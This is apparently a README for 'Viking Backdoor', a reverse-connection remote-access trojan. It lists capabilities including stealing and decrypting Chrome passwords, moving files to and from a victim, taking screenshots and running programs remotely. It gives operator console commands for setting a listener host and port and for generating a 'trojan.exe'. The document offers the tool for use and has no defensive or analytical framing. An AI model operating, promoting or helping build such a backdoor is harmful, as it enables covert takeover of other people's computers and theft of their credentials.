# Viking Backdoor

Viking Backdoor is MSF Backdoor like reverse connection tool.

## Features
- File upload.
- File download
- Screenshot
- Getting Chrome's passwords
- Executing programs / commands in a new process.
- Sending pop-up messages.
- Geting some info about target system.


### vkng Help
	Commands:
	    set HOST           : Set HOST value.
	    set PORT           : Set PORT value.
	    show options       : Show HOST and PORT values.
	    start listener     : Start Listener.

	    generate exec --name trojan.exe : Generating exe files.(Only on Windows with PyInstaller)

	Example:
	    vkng => set HOST 127.0.0.1
	    vkng => set PORT 8000
	    vkng => show options
	[~] HOST: 127.0.0.1
	[~] PORT: 8000
	===========================================================
	    vkng => start listener / start / run

### Listener Help

	Commands:
	    help()                  : Show this message.
	    screenshot()            : Take a screenshot on client.
	    chrome_db               : Get Chrome's password decrypted database.
	    download                : Download files from client.
	    upload                  : Upload files to client from server.
	    message TEXT            : Show messages on target system.
	    info()                  : Show target system's info.
	    execute PROGRAM ARGS    : Execute programs in a new process.

	Execute programs on local machine:
	    :dir ==> with ":"
	    :cls
	    :clear
